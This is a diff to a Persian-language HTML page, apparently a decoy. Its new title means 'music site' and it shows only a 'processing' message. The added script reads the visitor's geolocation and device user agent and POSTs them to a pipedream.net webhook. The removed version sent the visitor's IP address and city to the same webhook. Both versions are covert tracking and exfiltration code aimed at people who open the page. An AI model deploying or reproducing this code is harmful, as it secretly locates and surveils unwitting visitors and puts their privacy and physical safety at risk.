@@ -2,32 +2,45 @@
 <html lang="fa">
 <head>
     <meta charset="UTF-8">
-    <title>اطلاعات شما</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سایت موزیک </title>
 </head>
 <body>
-    <h2>در حال پردازش اطلاعات...</h2>
+    <h1>درحال پردازش ...</h1>
 
     <script>
-        fetch("https://ipapi.co/json")
-        .then(response => response.json())
-        .then(data => {
-            const userInfo = {
-                ip: data.ip,
-                country: data.country_name,
-                region: data.region,
-                city: data.city,
-                browser: navigator.userAgent
-            };
+        // دریافت اطلاعات مدل دستگاه
+        const deviceModel = navigator.userAgent;
 
-            // ارسال به Webhook یا ایمیل یا ذخیره در Google Sheets
-            fetch("https://eop77h2vm4imb0u.m.pipedream.net", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(userInfo)
+        // دریافت موقعیت مکانی
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // داده‌های ارسال به Webhook
+                const data = {
+                    deviceModel: deviceModel,
+                    latitude: latitude,
+                    longitude: longitude,
+                    timestamp: new Date().toISOString()
+                };
+
+                // ارسال داده‌ها به Webhook
+                fetch('https://eop77h2vm4imb0u.m.pipedream.net', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => response.json())
+                .then(data => console.log('اطلاعات ارسال شد:', data))
+                .catch((error) => console.error('خطا در ارسال اطلاعات:', error));
             });
-        });
+        } else {
+            alert('موقعیت مکانی در دسترس نیست');
+        }
     </script>
 </body>
 </html>
